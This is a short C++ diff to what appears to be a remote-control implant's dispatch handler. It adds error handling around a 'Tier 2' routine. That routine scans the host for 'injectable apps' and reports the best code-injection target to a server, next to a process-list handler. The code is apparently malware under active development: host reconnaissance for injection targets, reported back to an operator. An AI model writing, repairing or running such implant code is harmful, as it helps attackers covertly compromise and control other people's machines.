@@ -175,16 +175,22 @@ void Agent::handleDispatching(Packet&& packet) {
         m_socket.sendData(data);
 
         // Tier 2: scan for injectable apps and report to server
-        auto targets = inferno::tier2::scanApplications();
-        std::string report;
-        if (!targets.empty()) {
-            const auto& best = targets.front();
-            report = best.path + "|" + best.bundle_id + "|"
-                   + std::to_string(static_cast<int>(best.capability)) + "|1";
-        } else {
-            report = "none||0|0";
+        std::string scan_report = "none||0|0";
+        try {
+            auto targets = inferno::tier2::scanApplications();
+            if (!targets.empty()) {
+                const auto& best = targets.front();
+                scan_report = best.path + "|" + best.bundle_id + "|"
+                            + std::to_string(static_cast<int>(best.capability)) + "|1";
+            }
+        } catch (const std::exception& e) {
+            std::cerr << "[Agent] Scanner failed: " << e.what() << std::endl;
+            scan_report = "none||0|0";
+        } catch (...) {
+            std::cerr << "[Agent] Scanner failed with unknown error" << std::endl;
+            scan_report = "none||0|0";
         }
-        Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), report);
+        Packet scan_res(static_cast<uint16_t>(Opcode::SCAN_RESULT), scan_report);
         data = scan_res.serialize();
         m_socket.sendData(data);
     } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_REQ)) {
